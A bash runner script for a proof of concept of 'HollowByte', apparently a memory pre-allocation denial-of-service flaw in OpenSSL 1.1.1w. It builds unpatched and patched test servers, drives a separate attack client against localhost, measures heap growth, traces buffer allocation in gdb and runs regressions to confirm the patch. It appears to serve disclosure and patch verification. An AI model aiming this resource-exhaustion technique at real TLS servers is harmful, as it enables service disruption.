#!/bin/bash
# HollowByte (LP: #2161371) PoC runner.
set -u
D=/home/user/work/poc/026_HollowByte; OUT=$D/out; mkdir -p "$OUT"; cd "$D" || exit 2
BASE_SRC=/home/user/work/base/openssl-1.1.1w;      BASE_BLD=/home/user/work/base/openssl-1.1.1w
PRISTINE_SRC=/home/user/work/src_1.1.1w/openssl-1.1.1w; BASEASAN_BLD=/home/user/work/base_asan
PATCH_SRC=/home/user/work/patched/openssl-1.1.1w-ipalongpatch_20261102
PATCH_BLD=/home/user/work/patched/build;           PATCHASAN_BLD=/home/user/work/patched/build-asan
CERT=$PRISTINE_SRC/test/certs/servercert.pem; KEY=$PRISTINE_SRC/test/certs/serverkey.pem
N=200; CLAIM=131072
build() { local name=$1 src=$2 bld=$3 asan=$4 extra=""; [ "$asan" = 1 ] && extra="-fsanitize=address"
    echo "+ gcc -g -O0 -Wall $extra -I$bld/include -I$src/include hb_server.c -L$bld -lssl -lcrypto -Wl,-rpath,$bld -o hb_server_$name"
    gcc -g -O0 -Wall $extra -I"$bld/include" -I"$src/include" hb_server.c -L"$bld" -lssl -lcrypto -Wl,-rpath,"$bld" -o "hb_server_$name"; }
build base "$BASE_SRC" "$BASE_BLD" 0 || exit 2
build baseasan "$PRISTINE_SRC" "$BASEASAN_BLD" 1 || exit 2
build patched "$PATCH_SRC" "$PATCH_BLD" 0 || exit 2
build patchasan "$PATCH_SRC" "$PATCHASAN_BLD" 1 || exit 2

measure() { # name port count
    local name=$1 port=$2 count=$3
    echo "=== [$name] measurement server on 127.0.0.1:$port, $count connections, claimed ClientHello length $CLAIM ==="
    echo "+ ./hb_server_$name $port $count $CERT $KEY &  ;  python3 -I hb_client.py 127.0.0.1 $port $count $CLAIM 4 2"
    ASAN_OPTIONS=detect_leaks=0 ./hb_server_$name $port $count "$CERT" "$KEY" > "$OUT/measure_$name.txt" 2>&1 &
    local spid=$!
    sleep 0.7
    python3 -I hb_client.py 127.0.0.1 $port $count $CLAIM 4 2 > "$OUT/client_$name.txt" 2>&1
    wait $spid
    cat "$OUT/measure_$name.txt"
}
measure base 14026 $N
measure patched 14026 $N
echo "(ASan builds: mallinfo2 is not meaningful under ASan's allocator; VmRSS/VmData only, and no ASan error expected)"
measure baseasan 14026 100
measure patchasan 14026 100

gdbrun() { # name bld port
    local name=$1 bld=$2 port=$3
    echo "=== [$name] gdb on 'openssl s_server': break BUF_MEM_grow_clean, one HollowByte connection ==="
    echo "+ sleep 40 | LD_LIBRARY_PATH=$bld timeout 30 gdb -batch -x gdb_bufgrow.cmd --args $bld/apps/openssl s_server -accept $port -cert $CERT -key $KEY   (stdin kept open: s_server quits on stdin EOF)"
    sleep 40 | LD_LIBRARY_PATH=$bld timeout 30 gdb -batch -x gdb_bufgrow.cmd --args "$bld/apps/openssl" s_server -accept $port -cert "$CERT" -key "$KEY" > "$OUT/gdb_$name.txt" 2>&1 &
    local gpid=$! i
    for i in $(seq 1 80); do grep -qiE ":$(printf '%04X' $port) 00000000:0000 0A " /proc/net/tcp && break; sleep 0.25; done   # 0A = LISTEN
    echo "  (server listening after $i polls of 0.25s; now sending one HollowByte connection)"
    python3 -I hb_client.py 127.0.0.1 $port 1 $CLAIM 3 1 > "$OUT/gdb_client_$name.txt" 2>&1
    wait $gpid
    grep -E "^HIT|^#[0-5] " "$OUT/gdb_$name.txt"
}
gdbrun base "$BASE_BLD" 14126
gdbrun patched "$PATCH_BLD" 14126

echo "=== regression: normal handshakes and a >16 KiB certificate chain (multi-record Certificate message) with the PATCHED build ==="
./regress.sh "$PATCH_BLD" "$BASE_BLD" 14226 2>&1 | tee "$OUT/regress.txt"

echo; echo "=== VERDICT ==="; ok=1
gb=$(grep -oE "^RESULT: per-connection growth after the header = [0-9]+" "$OUT/measure_base.txt" | grep -oE "[0-9]+$")
gp=$(grep -oE "^RESULT: per-connection growth after the header = [0-9]+" "$OUT/measure_patched.txt" | grep -oE "[0-9]+$")
echo "per-connection heap growth after the 9 byte header: BASE=$gb bytes, PATCHED=$gp bytes"
[ -n "$gb" ] && [ "$gb" -gt 100000 ] || { echo "base growth too small"; ok=0; }
[ -n "$gp" ] && [ "$gp" -lt 4096 ] || { echo "patched growth not small"; ok=0; }
grep -q "HIT 1: BUF_MEM_grow_clean(str->max=[0-9]*, len=131076)" "$OUT/gdb_base.txt" || { echo "gdb base: no 131076 grow"; ok=0; }
grep -q "HIT 1: BUF_MEM_grow_clean(str->max=[0-9]*, len=16388)" "$OUT/gdb_patched.txt" || { echo "gdb patched: no 16388 grow"; ok=0; }
grep -q "AddressSanitizer" "$OUT/measure_baseasan.txt" "$OUT/measure_patchasan.txt" && { echo "ASan error in server"; ok=0; }
grep -q "^REGRESSION: PASS" "$OUT/regress.txt" || { echo "regression failed"; ok=0; }
[ "$ok" = 1 ] && echo "VERDICT: PASS (unpatched pre-allocates ~170 KiB per 9-byte connection; patched grows init_buf only with received data)" || echo "VERDICT: FAIL (see $OUT)"
